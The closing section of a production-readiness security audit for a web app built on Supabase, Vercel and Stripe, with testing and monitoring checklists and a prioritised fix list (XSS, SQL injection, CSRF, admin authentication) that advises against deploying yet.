### Functional Testing

- [ ] User signup works (password validation enabled)
- [ ] User login works
- [ ] Campaign creation works
- [ ] Landing page generation works
- [ ] QR codes decrypt correctly
- [ ] Form submissions create conversions
- [ ] Stripe webhooks process successfully
- [ ] Credits granted after payment

### Monitoring Setup

- [ ] **Vercel Logs**: Check for errors in production logs
- [ ] **Supabase Logs**: Monitor slow queries and errors
- [ ] **Sentry** (optional): Configure error tracking
- [ ] **Uptime Monitor**: Set up ping monitoring

---

## Summary

**Total Issues Found**: 43
- **Supabase Security Warnings**: 33
- **Application Security Issues**: 10

**Risk Level**: 🔴 HIGH (multiple critical vulnerabilities)

**Estimated Fix Time**: 12-16 hours

**Recommendation**: **DO NOT deploy to production** until all critical issues resolved.

**Priority Order**:
1. Apply Supabase migration (32 search_path warnings) - 30 min
2. Enable password protection in Supabase - 5 min
3. Protect admin routes with authentication - 2 hours
4. Add environment validation - 1 hour
5. Fix XSS vulnerability - 2 hours
6. Fix SQL injection - 1 hour
7. Generate encryption key - 10 min
8. Enable rate limiting - 30 min
9. Implement CSRF protection - 2 hours
10. Replace console.logs with logger - 3 hours

**Next Steps**: Review this document, prioritize fixes, and begin implementation in priority order.

---

**Document Version**: 1.0
**Last Updated**: November 25, 2025
**Author**: Production Readiness Audit Team
**Status**: ⚠️ BLOCKING PRODUCTION DEPLOYMENT
